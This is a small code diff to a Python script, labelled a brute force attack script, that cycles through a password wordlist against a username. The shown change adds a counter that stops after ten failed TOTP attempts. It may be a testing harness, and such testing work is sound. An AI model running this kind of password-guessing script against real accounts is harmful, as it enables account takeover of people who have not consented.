@@ -1,4 +1,6 @@
-# brute force attack
+"""
+Script for brute force attack
+"""
 import requests
 import time
 import json
@@ -31,6 +33,7 @@ def brute_force(username):
 
     hash_mode = target.get("hash_mode", "sha256")
     PASSWORD_LIST = load_wordlist()
+    totp_failures = 0
 
     for candidate in PASSWORD_LIST:
         start = time.time()
@@ -66,6 +69,13 @@ def brute_force(username):
         if resp.status_code == 401 and "Invalid TOTP" in resp.text:
             print(f"[TOTP] {username} rejected due to invalid TOTP, stopping attempts.")
             return
+        
+        if target.get("totp_secret") and resp.status_code == 401: 
+            totp_failures += 1 
+            if totp_failures >= 10: 
+                print(f"[TOTP] {username} blocked after {totp_failures} invalid TOTP attempts.") 
+                return
+
 
         if resp.status_code == 200:
             result = "SUCCESS"
